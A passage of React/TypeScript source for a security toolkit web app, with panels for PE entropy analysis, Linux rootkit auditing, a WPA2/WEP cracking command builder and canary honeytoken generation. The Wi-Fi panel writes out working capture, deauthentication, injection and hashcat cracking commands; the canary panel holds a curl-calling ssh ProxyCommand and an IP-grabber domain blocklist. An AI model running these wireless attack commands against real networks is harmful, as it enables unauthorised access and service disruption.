                  : "border-border bg-background text-text-muted hover:border-accent hover:text-text"
              }`}
            >
              {BINARY_PRESETS[k].label}
            </button>
          ))}
        </div>
      </div>

      {/* Section Table */}
      <div className="overflow-x-auto rounded-xs border border-border bg-background">
        <table className="w-full text-left font-mono-code text-xs">
          <thead className="border-b border-border bg-surface text-[10px] uppercase text-text-muted">
            <tr>
              <th className="p-2.5">Section</th>
              <th className="p-2.5">Virtual Size</th>
              <th className="p-2.5">Raw Size (Disk)</th>
              <th className="p-2.5">Perms</th>
              <th className="p-2.5">Shannon Entropy (0–8 bits/B)</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-border">
            {sections.map((s, idx) => (
              <tr key={idx}>
                <td className="p-2.5 font-bold text-text">{s.name}</td>
                <td className="p-2.5 text-text-muted">{s.virtualSize.toLocaleString()} B</td>
                <td className="p-2.5">
                  <span className={s.rawSize === 0 ? "text-red-400 font-bold" : "text-text-muted"}>
                    {s.rawSize.toLocaleString()} B
                  </span>
                </td>
                <td className="p-2.5">
                  <span
                    className={`rounded-xs px-1.5 py-0.5 text-[10px] font-bold ${
                      s.perms === "RWX"
                        ? "bg-red-500/20 text-red-300"
                        : "bg-surface text-text-muted"
                    }`}
                  >
                    {s.perms}
                  </span>
                </td>
                <td className="p-2.5">
                  <div className="flex items-center gap-2">
                    <div className="h-2 w-28 rounded-xs bg-surface overflow-hidden border border-border">
                      <div
                        className={`h-full ${
                          s.entropy >= 7.2
                            ? "bg-red-500"
                            : s.entropy >= 6.4
                            ? "bg-amber-500"
                            : "bg-emerald-500"
                        }`}
                        style={{ width: `${(s.entropy / 8) * 100}%` }}
                      />
                    </div>
                    <span
                      className={`font-bold ${
                        s.entropy >= 7.2 ? "text-red-400" : "text-text"
                      }`}
                    >
                      {s.entropy.toFixed(2)}
                    </span>
                  </div>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* IAT API Toggles & Findings */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
        <div className="lg:col-span-6 rounded-xs border border-border bg-background p-4 space-y-2.5">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            Import Address Table (IAT) Windows API Calls
          </span>
          <div className="flex flex-wrap gap-1.5">
            {SUSPICIOUS_WIN_APIS.map((api) => {
              const active = activeImports.includes(api);
              return (
                <button
                  key={api}
                  type="button"
                  onClick={() => toggleImport(api)}
                  className={`rounded-xs border px-2 py-1 font-mono-code text-[11px] transition cursor-pointer ${
                    active
                      ? "border-red-500/60 bg-red-500/15 text-red-300 font-bold"
                      : "border-border bg-surface text-text-muted hover:text-text"
                  }`}
                >
                  {api}
                </button>
              );
            })}
          </div>
          <div className="pt-2 border-t border-border">
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Live Byte String Shannon Entropy Calculator ({liveSampleEntropy.toFixed(3)} bits/byte)
            </label>
            <input
              type="text"
              value={customBytesText}
              onChange={(e) => setCustomBytesText(e.target.value)}
              className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
            />
          </div>
        </div>

        <div className="lg:col-span-6 rounded-xs border border-border bg-background p-4 space-y-2">
          <div className="flex items-center justify-between">
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
              Packer & Injection Chain Verdict
            </span>
            <span className="font-mono-code text-xs font-bold text-text">
              {findings.packerVerdict}
            </span>
          </div>
          <div className="space-y-1.5">
            {findings.flags.map((f, i) => (
              <div
                key={i}
                className="rounded-xs border border-red-500/30 bg-red-500/10 p-2 text-xs text-text leading-snug"
              >
                <span className="font-mono-code font-bold text-red-400">[!] </span>
                {f}
              </div>
            ))}
          </div>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 5. LINUX ROOTKIT, LD_PRELOAD & SYSCALL HOOK AUDITOR
 * ========================================================================== */
interface RootkitVector {
  id: string;
  title: string;
  layer: "Userland" | "Kernel LKM" | "eBPF" | "Persistence";
  discrepancy: string;
  auditCmd: string;
  remediation: string;
}

const ROOTKIT_VECTORS: RootkitVector[] = [
  {
    id: "ld_preload",
    title: "Userland LD_PRELOAD Hook (/etc/ld.so.preload)",
    layer: "Userland",
    discrepancy:
      "Malicious shared object (.so) intercepts libc readdir() and accept() so ps, ls, and netstat hide rootkit files/ports (bdvl / Azazel / Jynx2).",
    auditCmd: `ls -la /etc/ld.so.preload; env | grep LD_; grep -a "ld.so.preload" /lib/*/ld-*.so`,
    remediation:
      "Boot from live ISO or use statically compiled busybox (`busybox cat /etc/ld.so.preload`) to bypass dynamic linker hooks.",
  },
  {
    id: "lkm_hidden",
    title: "LKM Kernel Module Unlinking (/proc/modules vs /sys/module)",
    layer: "Kernel LKM",
    discrepancy:
      "Rootkit calls list_del(&THIS_MODULE->list) to vanish from lsmod and /proc/modules while leaving kobject remnants in /sys/module or /proc/kallsyms (Diamorphine / Reptile).",
    auditCmd: `diff <(awk '{print $1}' /proc/modules | sort) <(ls /sys/module | sort); grep -E "diamorphine|reptile|sys_call_table" /proc/kallsyms`,
    remediation:
      "Enable kernel module signature enforcement (CONFIG_MODULE_SIG_FORCE=y) and kernel lockdown=confidentiality.",
  },
  {
    id: "hidden_pids",
    title: "Hidden PID Discrepancy (/proc Brute-Force vs ps -ef)",
    layer: "Kernel LKM",
    discrepancy:
      "Hooked getdents64() filters PID directories when listing /proc, but direct chdir('/proc/<PID>') or kill(pid, 0) reveals the hidden process.",
    auditCmd: `for p in $(seq 1 65535); do [ -d "/proc/$p" ] && ! ps -p "$p" >/dev/null 2>&1 && echo "HIDDEN PID: $p ($(cat /proc/$p/comm 2>/dev/null))"; done`,
    remediation:
      "Run unhide-linux (`unhide proc sys`) and inspect kernel taint flags (`cat /proc/sys/kernel/tainted`).",
  },
  {
    id: "ebpf_hooks",
    title: "eBPF Tracepoint / XDP Rootkit Hooks (bpftool)",
    layer: "eBPF",
    discrepancy:
      "Attacker attaches eBPF programs to raw_syscalls:sys_enter or bpf_probe_write_user to spoof /etc/shadow reads or drop C2 magic packets before iptables.",
    auditCmd: `bpftool prog show; bpftool map show; sysctl kernel.unprivileged_bpf_disabled`,
    remediation:
      "Set sysctl kernel.unprivileged_bpf_disabled=1 and audit pinned BPF objects under /sys/fs/bpf.",
  },
  {
    id: "suid_pam",
    title: "Rogue Linux Capabilities & PAM Authentication Backdoor",
    layer: "Persistence",
    discrepancy:
      "cap_setuid+ep granted to /usr/bin/python3 (invisible to SUID find) or backdoored /lib/security/pam_unix.so accepting a hardcoded master password.",
    auditCmd: `getcap -r / 2>/dev/null; find / -perm -4000 -type f 2>/dev/null; debsums -s libpam-modules || rpm -V pam`,
    remediation:
      "Remove capabilities (`setcap -r /usr/bin/python3`) and verify PAM shared object SHA-256 hashes against package manager.",
  },
];

function LinuxRootkitLdPreloadSyscallAuditor({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [activeVectors, setActiveVectors] = useState<string[]>([
    "ld_preload",
    "lkm_hidden",
    "hidden_pids",
    "ebpf_hooks",
    "suid_pam",
  ]);
  const [simulatedTaint, setSimulatedTaint] = useState<number>(12289); // P(1) + O(4096) + E(8192)

  useEffect(() => {
    if (resetTrigger > 0) {
      setActiveVectors(["ld_preload", "lkm_hidden", "hidden_pids", "ebpf_hooks", "suid_pam"]);
      setSimulatedTaint(12289);
    }
  }, [resetTrigger]);

  const toggleVector = (id: string) => {
    setActiveVectors((prev) =>
      prev.includes(id) ? prev.filter((x) => x !== id) : [...prev, id]
    );
  };

  const selectedList = useMemo(
    () => ROOTKIT_VECTORS.filter((v) => activeVectors.includes(v.id)),
    [activeVectors]
  );

  const bashScript = useMemo(() => {
    const lines = [
      `#!/usr/bin/env bash`,
      `# ZeroUniverse Linux Rootkit, LD_PRELOAD & Syscall Forensic Live-Response Script`,
      `set -u`,
      `echo "=== [0] KERNEL TAINT & INTEGRITY CHECK ==="`,
      `cat /proc/sys/kernel/tainted`,
      ``,
      ...selectedList.flatMap((v, idx) => [
        `echo "=== [${idx + 1}] ${v.title.toUpperCase()} ==="`,
        v.auditCmd,
        ``,
      ]),
    ];
    return lines.join("\n");
  }, [selectedList]);

  useEffect(() => {
    setOutput(
      [
        `=== LINUX ROOTKIT & SYSCALL HOOK FORENSIC AUDIT ===`,
        `Selected Hunting Modules: ${selectedList.length} / ${ROOTKIT_VECTORS.length}`,
        `Kernel Taint Mask: ${simulatedTaint} (${
          simulatedTaint > 0
            ? "TAINTED: Out-of-tree / Unsigned LKM loaded"
            : "0 (Clean Untainted Kernel)"
        })`,
        ``,
        ...selectedList.map(
          (v) =>
            `[${v.layer}] ${v.title}\n  Discrepancy: ${v.discrepancy}\n  Command: ${v.auditCmd}\n  Fix: ${v.remediation}`
        ),
        ``,
        `--- GENERATED BASH AUDIT SCRIPT ---`,
        bashScript,
      ].join("\n")
    );
  }, [selectedList, simulatedTaint, bashScript, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
        <div className="flex items-center gap-2">
          <Terminal className="h-4 w-4 text-accent" />
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            Linux Rootkit & Kernel/Userland Discrepancy Matrix
          </span>
        </div>
        <div className="flex items-center gap-2">
          <span className="font-mono-code text-xs text-text-muted">/proc/sys/kernel/tainted:</span>
          {[
            { val: 0, label: "0 (Clean)" },
            { val: 4096, label: "4096 (Out-of-Tree LKM)" },
            { val: 12289, label: "12289 (Unsigned LKM)" },
          ].map((t) => (
            <button
              key={t.val}
              type="button"
              onClick={() => setSimulatedTaint(t.val)}
              className={`rounded-xs border px-2 py-0.5 font-mono-code text-[10px] font-bold cursor-pointer ${
                simulatedTaint === t.val
                  ? "border-[#ff6a00] bg-[#ff6a00] text-white"
                  : "border-border bg-background text-text-muted"
              }`}
            >
              {t.label}
            </button>
          ))}
        </div>
      </div>

      {/* 5 Rootkit Vectors */}
      <div className="grid grid-cols-1 gap-2.5">
        {ROOTKIT_VECTORS.map((vec) => {
          const active = activeVectors.includes(vec.id);
          return (
            <div
              key={vec.id}
              onClick={() => toggleVector(vec.id)}
              className={`rounded-xs border p-3.5 transition cursor-pointer ${
                active
                  ? "border-accent/60 bg-background"
                  : "border-border bg-surface/40 opacity-65"
              }`}
            >
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div className="flex items-center gap-2">
                  <input
                    type="checkbox"
                    checked={active}
                    onChange={() => {}}
                    className="accent-[#ff6a00]"
                  />
                  <span className="font-heading text-xs font-bold text-text">{vec.title}</span>
                </div>
                <span className="rounded-xs bg-surface px-2 py-0.5 font-mono-code text-[10px] font-bold text-accent border border-border">
                  {vec.layer}
                </span>
              </div>
              <p className="mt-1.5 text-xs text-text-muted">{vec.discrepancy}</p>
              <div className="mt-2 rounded-xs bg-surface p-2 font-mono-code text-[11px] text-emerald-400 overflow-x-auto">
                $ {vec.auditCmd}
              </div>
            </div>
          );
        })}
      </div>

      {/* Ready-to-run Bash Script */}
      <div className="rounded-xs border border-border bg-background p-3.5 space-y-2">
        <div className="flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
            Generated Live-Response Bash Forensic Script
          </span>
          <InlineCopyButton text={bashScript} label="Copy Audit Script" />
        </div>
        <pre className="overflow-x-auto rounded-xs bg-surface p-3 font-mono-code text-xs text-text leading-relaxed">
          {bashScript}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 6. WI-FI WPA2 PMKID, EAPOL HANDSHAKE & HASHCAT COMMAND BUILDER
 * ========================================================================== */
function WifiWpa2PmkidHashcatCommandBuilder({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [bssid, setBssid] = useState("A4:2B:8C:99:E1:10");
  const [essid, setEssid] = useState("Corp_Office_5G");
  const [iface, setIface] = useState("wlan0mon");
  const [channel, setChannel] = useState(36);
  const [vector, setVector] = useState<"pmkid" | "eapol" | "wpa3" | "wep">("pmkid");
  const [gpuSpeedKh, setGpuSpeedKh] = useState(1650); // RTX 4090 ~ 1,650 kH/s for WPA-PBKDF2
  const [keyspaceMode, setKeyspaceMode] = useState<"rockyou" | "digits8" | "digits10" | "alphanum8">("digits8");

  useEffect(() => {
    if (resetTrigger > 0) {
      setBssid("A4:2B:8C:99:E1:10");
      setEssid("Corp_Office_5G");
      setIface("wlan0mon");
      setChannel(36);
      setVector("pmkid");
      setGpuSpeedKh(1650);
      setKeyspaceMode("digits8");
    }
  }, [resetTrigger]);

  const cleanMacNoColons = bssid.replace(/[^0-9a-fA-F]/g, "").toLowerCase();

  const commands = useMemo(() => {
    if (vector === "pmkid") {
      return [
        `# 1. Stop interfering network managers & enable monitor mode`,
        `sudo systemctl stop NetworkManager wpa_supplicant`,
        `sudo ip link set wlan0 down && sudo iw dev wlan0 set type monitor && sudo ip link set wlan0 up`,
        ``,
        `# 2. Clientless WPA2 RSN PMKID capture via hcxdumptool (no connected client required)`,
        `echo "${cleanMacNoColons}" > filter_bssid.txt`,
        `sudo hcxdumptool -i ${iface} -o pmkid_${cleanMacNoColons}.pcapng --filterlist_ap=filter_bssid.txt --filtermode=2 --enable_status=15`,
        ``,
        `# 3. Convert pcapng to Hashcat -m 22000 format`,
        `hcxpcapngtool -o ${essid}.hc22000 pmkid_${cleanMacNoColons}.pcapng`,
        ``,
        `# 4. Crack WPA-PBKDF2-PMKID+EAPOL with Hashcat (Mode 22000)`,
        `hashcat -m 22000 -a 0 -w 3 ${essid}.hc22000 /usr/share/wordlists/rockyou.txt -r best64.rule`,
        `hashcat -m 22000 -a 3 -w 3 ${essid}.hc22000 ?d?d?d?d?d?d?d?d`,
      ].join("\n");
    }
    if (vector === "eapol") {
      return [
        `# 1. Lock monitor interface onto Channel ${channel} and capture 4-Way EAPOL Handshake`,
        `sudo airodump-ng -c ${channel} --bssid ${bssid} -w handshake_${cleanMacNoColons} ${iface}`,
        ``,
        `# 2. Send targeted Deauthentication frames (or wait for natural roam)`,
        `sudo aireplay-ng -0 5 -a ${bssid} ${iface}`,
        ``,
        `# 3. Convert .cap to Hashcat 22000 and run GPU dictionary/mask audit`,
        `hcxpcapngtool -o ${essid}.hc22000 handshake_${cleanMacNoColons}-01.cap`,
        `hashcat -m 22000 -w 3 ${essid}.hc22000 /usr/share/wordlists/rockyou.txt`,
        `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b ${bssid} handshake_${cleanMacNoColons}-01.cap`,
      ].join("\n");
    }
    if (vector === "wpa3") {
      return [
        `# 1. Audit WPA3-Personal Transition Mode (WPA2/WPA3 mixed AKM 00-0F-AC:2 & 00-0F-AC:8)`,
        `sudo airodump-ng -c ${channel} --bssid ${bssid} ${iface}`,
        ``,
        `# 2. If Management Frame Protection (802.11w PMF) is optional, test rogue WPA2-PSK AP downgrade`,
        `# Remediation: Set AP security to Pure WPA3-SAE Only + Mandatory 802.11w PMF (ieee80211w=2)`,
      ].join("\n");
    }
    return [
      `# 1. Legacy WEP 64/128-bit IV capture & ARP replay injection`,
      `sudo airodump-ng -c ${channel} --bssid ${bssid} -w wep_ivs ${iface}`,
      `sudo aireplay-ng -3 -b ${bssid} ${iface}`,
      `# 2. Statistical PTW / KoreK key recovery after ~25,000 IVs`,
      `aircrack-ng wep_ivs-01.cap`,
    ].join("\n");
  }, [vector, bssid, essid, iface, channel, cleanMacNoColons]);

  const crackStats = useMemo(() => {
    const speedHashesSec = gpuSpeedKh * 1000;
    const keyspaces: Record<typeof keyspaceMode, { name: string; count: number }> = {
      rockyou: { name: "rockyou.txt + best64.rule (~1.1B candidates)", count: 1_100_000_000 },
      digits8: { name: "8-Digit Numeric (?d?d?d?d?d?d?d?d)", count: 100_000_000 },
      digits10: { name: "10-Digit Phone Number (?d x 10)", count: 10_000_000_000 },
      alphanum8: { name: "8-Char Lowercase+Digits (36^8)", count: 2_821_109_907_456 },
    };
    const ks = keyspaces[keyspaceMode];
    const seconds = ks.count / speedHashesSec;
    const formattedTime =
      seconds < 60
        ? `${seconds.toFixed(1)} seconds`
        : seconds < 3600
        ? `${(seconds / 60).toFixed(1)} minutes`
        : seconds < 86400
        ? `${(seconds / 3600).toFixed(2)} hours`
        : `${(seconds / 86400).toFixed(1)} days`;

    return { ks, speedHashesSec, formattedTime };
  }, [gpuSpeedKh, keyspaceMode]);

  useEffect(() => {
    setOutput(
      [
        `=== WI-FI WPA2/WPA3 AUDIT & HASHCAT COMMAND REPORT ===`,
        `Target ESSID: ${essid} | BSSID: ${bssid} | Channel: ${channel} | Interface: ${iface}`,
        `Attack Vector: ${vector.toUpperCase()}`,
        `PBKDF2-HMAC-SHA1 Speed: ${gpuSpeedKh.toLocaleString()} kH/s | Keyspace: ${crackStats.ks.name} -> Est. Time: ${crackStats.formattedTime}`,
        ``,
        commands,
      ].join("\n")
    );
  }, [essid, bssid, channel, iface, vector, gpuSpeedKh, crackStats, commands, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
        <div className="flex items-center gap-2">
          <Wifi className="h-4 w-4 text-accent" />
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            Wireless 802.11 Assessment Vector
          </span>
        </div>
        <div className="flex flex-wrap gap-1.5">
          {[
            { id: "pmkid", label: "WPA2 PMKID Clientless" },
            { id: "eapol", label: "WPA2 4-Way EAPOL" },
            { id: "wpa3", label: "WPA3-SAE Transition" },
            { id: "wep", label: "WEP IV Statistical" },
          ].map((v) => (
            <button
              key={v.id}
              type="button"
              onClick={() => setVector(v.id as "pmkid" | "eapol" | "wpa3" | "wep")}
              className={`rounded-xs border px-2.5 py-1 font-heading text-[11px] font-bold uppercase tracking-wider transition cursor-pointer ${
                vector === v.id
                  ? "border-[#ff6a00] bg-[#ff6a00] text-white"
                  : "border-border bg-background text-text-muted hover:border-accent hover:text-text"
              }`}
            >
              {v.label}
            </button>
          ))}
        </div>
      </div>

      {/* Target Parameters */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Target BSSID MAC
          </label>
          <input
            type="text"
            value={bssid}
            onChange={(e) => setBssid(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Target ESSID (SSID)
          </label>
          <input
            type="text"
            value={essid}
            onChange={(e) => setEssid(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Monitor Interface
          </label>
          <input
            type="text"
            value={iface}
            onChange={(e) => setIface(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            802.11 Channel
          </label>
          <input
            type="number"
            min={1}
            max={165}
            value={channel}
            onChange={(e) => setChannel(Number(e.target.value) || 6)}
            className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
      </div>

      {/* PBKDF2-HMAC-SHA1 Cracking Speed Calculator */}
      <div className="rounded-xs border border-border bg-background p-4 grid grid-cols-1 md:grid-cols-3 gap-3 items-center">
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Hardware Benchmark (Hashcat -m 22000)
          </label>
          <select
            value={gpuSpeedKh}
            onChange={(e) => setGpuSpeedKh(Number(e.target.value))}
            className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
          >
            <option value={1650}>NVIDIA RTX 4090 (~1,650 kH/s)</option>
            <option value={720}>NVIDIA RTX 4070 (~720 kH/s)</option>
            <option value={240}>Apple M3 Max GPU (~240 kH/s)</option>
            <option value={18}>8-Core Laptop CPU (~18 kH/s)</option>
          </select>
        </div>
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Candidate Keyspace
          </label>
          <select
            value={keyspaceMode}
            onChange={(e) =>
              setKeyspaceMode(e.target.value as "rockyou" | "digits8" | "digits10" | "alphanum8")
            }
            className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
          >
            <option value="digits8">8-Digit Numeric (?d x 8 = 10^8)</option>
            <option value="rockyou">rockyou.txt + best64 (~1.1B)</option>
            <option value="digits10">10-Digit Phone (?d x 10 = 10^10)</option>
            <option value="alphanum8">8-Char Lowercase+Digits (36^8)</option>
          </select>
        </div>
        <div className="rounded-xs border border-border bg-surface p-2.5 text-center">
          <div className="text-[10px] font-heading uppercase text-text-muted">
            Exhaustive Time (4,096 SHA-1 Rnds)
          </div>
          <div className="font-mono-code text-sm font-bold text-accent">
            {crackStats.formattedTime}
          </div>
        </div>
      </div>

      {/* Generated Commands */}
      <div className="rounded-xs border border-border bg-background p-3.5 space-y-2">
        <div className="flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
            Generated hcxdumptool / hcxpcapngtool / Hashcat -m 22000 Pipeline
          </span>
          <InlineCopyButton text={commands} label="Copy Pipeline" />
        </div>
        <pre className="overflow-x-auto rounded-xs bg-surface p-3 font-mono-code text-xs text-text leading-relaxed">
          {commands}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 7. CANARY HONEYTOKEN, WEBHOOK TRIPWIRE & IP GRABBER UNPACKER
 * ========================================================================== */
const GRABBER_DOMAINS = [
  "grabify.link",
  "iplogger.org",
  "iplogger.com",
  "2no.co",
  "yip.su",
  "blasze.tk",
  "ps3cfw.com",
  "bmwforum.co",
  "leancoding.co",
  "stopify.co",
  "freegiftcards.co",
];

function CanaryHoneytokenTripwireGenerator({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [template, setTemplate] = useState<"aws" | "doc" | "ssh" | "mysql" | "pixel">("aws");
  const [webhookBase, setWebhookBase] = useState("https://canary.secops.internal/alert");
  const [tokenId, setTokenId] = useState("9f82c4e1a7b3");
  const [placementMemo, setPlacementMemo] = useState("finance-laptop-git-env-decoy");
  const [suspectUrl, setSuspectUrl] = useState(
    "https://steamcommunity.com@grabify.link/IMG_8842.jpg.exe?ref=discord_webhook"
  );

  const regenerateTokenId = () => {
    const arr = new Uint8Array(6);
    if (typeof window !== "undefined" && window.crypto) {
      window.crypto.getRandomValues(arr);
    }
    const hex = Array.from(arr)
      .map((b) => b.toString(16).padStart(2, "0"))
      .join("");
    setTokenId(hex || "a74c9012e8f1");
  };

  useEffect(() => {
    if (resetTrigger > 0) {
      setTemplate("aws");
      setWebhookBase("https://canary.secops.internal/alert");
      setPlacementMemo("finance-laptop-git-env-decoy");
      setSuspectUrl("https://steamcommunity.com@grabify.link/IMG_8842.jpg.exe?ref=discord_webhook");
    }
  }, [resetTrigger]);

  const generatedCanary = useMemo(() => {
    const url = `${webhookBase.replace(/\/$/, "")}/${tokenId}?memo=${encodeURIComponent(
      placementMemo
    )}`;
    const awsKeyId = `AKIA${tokenId.toUpperCase().padEnd(16, "7").slice(0, 16)}`;
    const awsSecret = `${btoa(`${tokenId}:${placementMemo}:canary-secret-key`).slice(0, 40)}`;

    if (template === "aws") {
      return [
        `# Decoy ~/.aws/credentials Honeytoken (Memo: ${placementMemo})`,
        `[prod-s3-backups]`,
        `aws_access_key_id = ${awsKeyId}`,
        `aws_secret_access_key = ${awsSecret}`,
        `region = us-east-1`,
        ``,
        `# CloudTrail / EventBridge Detection Rule:`,
        `# Alert immediately on ANY event where userIdentity.accessKeyId == "${awsKeyId}"`,
      ].join("\n");
    }
    if (template === "doc") {
      return [
        `<!-- Inject into word/_rels/settings.xml.rels inside a decoy .docx archive -->`,
        `<Relationship Id="rIdCanary1"`,
        `  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"`,
        `  Target="${url}"`,
        `  TargetMode="External"/>`,
      ].join("\n");
    }
    if (template === "ssh") {
      return [
        `# Append to ~/.ssh/config — Triggers webhook when attacker attempts lateral movement`,
        `Host prod-vault-bastion-01`,
        `    HostName 10.240.0.99`,
        `    User root`,
        `    ProxyCommand sh -c "curl -s -m 2 '${url}&user=%r' >/dev/null 2>&1; nc %h %p"`,
      ].join("\n");
    }
    if (template === "mysql") {
      return [
        `-- Insert decoy superadmin row into users table and alert on SELECT/login attempt`,
        `INSERT INTO users (id, username, email, password_hash, api_webhook_callback, role)`,
        `VALUES (9999, 'svc_vault_root_${tokenId.slice(0, 4)}', 'canary+${tokenId}@secops.internal',`,
        `        '$2y$12$CanaryDecoyHashDoNotTouch${tokenId.padEnd(22, "X")}', '${url}', 'superadmin');`,
      ].join("\n");
    }
    return [
      `<!-- Zero-Width / Invisible HTML & CSS Webhook Canary Pixel -->`,
      `<div style="position:absolute;width:1px;height:1px;opacity:0;background-image:url('${url}')"></div>`,
      `<img src="${url}" width="1" height="1" alt="" style="display:none;" />`,
    ].join("\n");
  }, [template, webhookBase, tokenId, placementMemo]);

  const urlInspection = useMemo(() => {
    const flags: string[] = [];
    let host = "";
    let hasBasicAuthSpoof = false;
    try {
      const parsed = new URL(suspectUrl);
      host = parsed.hostname.toLowerCase();
      if (parsed.username || parsed.password || suspectUrl.includes("@")) {
        hasBasicAuthSpoof = true;
        flags.push(
          `CRITICAL: URL uses '@' Basic-Auth credential syntax to spoof "${parsed.username}" while actually connecting to "${host}"!`
        );
      }
      if (GRABBER_DOMAINS.some((d) => host === d || host.endsWith(`.${d}`))) {
        flags.push(`CRITICAL: Host "${host}" is a known IP Grabber / Telemetry tracking domain!`);
      }
      if (suspectUrl.includes("discord.com/api/webhooks")) {
        flags.push("HIGH: Contains hardcoded Discord Webhook exfiltration endpoint.");
      }
      if (/\.(jpg|png|pdf|docx)\.(exe|scr|bat|ps1|vbs)/i.test(parsed.pathname)) {
        flags.push(
          `CRITICAL: Double file extension masquerading detected in path (${parsed.pathname}).`
        );
      }
    } catch {
      flags.push("Malformed URL syntax.");
    }
    return { host, hasBasicAuthSpoof, flags };
  }, [suspectUrl]);

  useEffect(() => {
    setOutput(
      [
        `=== CANARY HONEYTOKEN & SUSPICIOUS URL UNPACKER ===`,
        `Canary Template: ${template.toUpperCase()} | Token ID: ${tokenId} | Memo: ${placementMemo}`,
        ``,
        generatedCanary,
        ``,
        `--- SUSPICIOUS URL / IP GRABBER ANALYSIS ---`,
        `Input URL: ${suspectUrl}`,
        `Actual Destination Host: ${urlInspection.host || "N/A"}`,
        ...(urlInspection.flags.length
          ? urlInspection.flags.map((f) => `[!] ${f}`)
          : ["No known grabber signatures matched."]),
      ].join("\n")
    );
  }, [template, tokenId, placementMemo, generatedCanary, suspectUrl, urlInspection, setOutput]);

  return (
    <div className="space-y-5">
      {/* Part A: Canary Honeytoken Studio */}
      <div className="space-y-3">
        <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
          <div className="flex items-center gap-2">
            <Radio className="h-4 w-4 text-accent" />
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
              Part A: Defensive Canary Honeytoken Generator
            </span>
          </div>
          <div className="flex flex-wrap gap-1.5">
            {[
              { id: "aws", label: "Fake AWS AKIA Key" },
              { id: "doc", label: "Word/PDF Remote URL" },
              { id: "ssh", label: "~/.ssh/config Canary" },
              { id: "mysql", label: "SQL Dump Fake Admin" },
              { id: "pixel", label: "HTML/CSS Webhook Pixel" },
            ].map((t) => (
              <button
                key={t.id}
                type="button"
                onClick={() => setTemplate(t.id as "aws" | "doc" | "ssh" | "mysql" | "pixel")}
                className={`rounded-xs border px-2.5 py-1 font-heading text-[11px] font-bold uppercase tracking-wider transition cursor-pointer ${
                  template === t.id
                    ? "border-[#ff6a00] bg-[#ff6a00] text-white"
                    : "border-border bg-background text-text-muted hover:border-accent hover:text-text"
                }`}
              >
                {t.label}
              </button>
            ))}
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Canary Listener / Webhook Base URL
            </label>
            <input
              type="text"
              value={webhookBase}
              onChange={(e) => setWebhookBase(e.target.value)}
              className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text"
            />
          </div>
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Decoy Placement Memo
            </label>
            <input
              type="text"
              value={placementMemo}
              onChange={(e) => setPlacementMemo(e.target.value)}
              className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text"
            />
          </div>
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Unique Canary Token ID
            </label>
            <div className="flex gap-1.5">
              <input
                type="text"
                value={tokenId}
                onChange={(e) => setTokenId(e.target.value)}
                className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-accent"
              />
              <button
                type="button"
                onClick={regenerateTokenId}
                className="rounded-xs border border-border bg-background px-2.5 py-1.5 text-text-muted hover:border-accent hover:text-accent cursor-pointer"
                title="Generate New Token ID"
              >
                <RefreshCw className="h-3.5 w-3.5" />
              </button>
            </div>
          </div>
        </div>

        <div className="rounded-xs border border-border bg-background p-3.5 space-y-2">
          <div className="flex items-center justify-between">
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
              Generated Honeytoken Artifact
            </span>
            <InlineCopyButton text={generatedCanary} label="Copy Canary" />
          </div>
